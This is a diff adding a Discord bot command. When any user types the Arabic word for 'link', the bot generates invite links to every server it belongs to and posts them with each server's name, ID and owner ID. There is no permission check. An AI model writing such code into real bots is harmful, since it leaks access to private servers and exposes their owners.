@@ -167,6 +167,31 @@ client.on('message', message =>{
 
 
 
+Yousef.on('message', msg => {
+    if(msg.author.bot) return;
+
+    if(msg.content === 'رابط') {
+      client.guilds.forEach(g => {
+ ////////////يوسف////////////////////////
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 10,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        اقصى الاستخدام : mem 10
+        رابط السيرفر : <https://discord.gg/${i.code}>
+        السيرفر : ${g.name} | Id : ${g.id}
+        صاحب السيرفر : ${g.owner.id}
+        **
+        `))
+
+
+      })
+    }
+
+  })
+
 
 
 
